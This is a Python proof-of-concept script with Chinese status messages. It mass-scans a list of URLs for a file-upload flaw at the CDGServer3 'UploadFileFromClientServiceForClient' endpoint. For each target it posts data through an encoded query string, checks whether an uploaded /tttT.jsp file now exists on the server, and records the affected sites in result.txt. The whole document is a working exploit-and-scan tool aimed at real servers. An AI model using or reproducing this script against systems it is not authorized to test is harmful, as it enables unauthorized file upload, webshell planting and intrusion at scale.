import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Accept": "*/*",
        "Content-Length": "5",
        "Connection": "keep-alive",
    }   

def poc(url):
    payload = '/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM'
    target = url+payload
    data = 'shell'
    try:
        rsp = requests.get(url=url,verify=False,timeout=5)
        if rsp.status_code == 200:
            rsp2 = requests.post(url=target,headers=headers,data=data,verify=False,timeout=5)
            if rsp2.status_code == 200:
                rsp3 = requests.get(url=url+'/tttT.jsp',verify=False,timeout=5)
                if 'shell' in rsp3.text:
                    print(f"[+]{url}存在文件上传漏洞")
                    with open('./result.txt','a',encoding="utf-8") as f:
                        f.write(url+'\n')
                else:
                    print(f"[-]{url}不存在文件上传漏洞")
        else:
            print("[-]站点有问题")
    except Exception as e:
        print("该站点有问题")

def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
        
if __name__ == '__main__':
    main()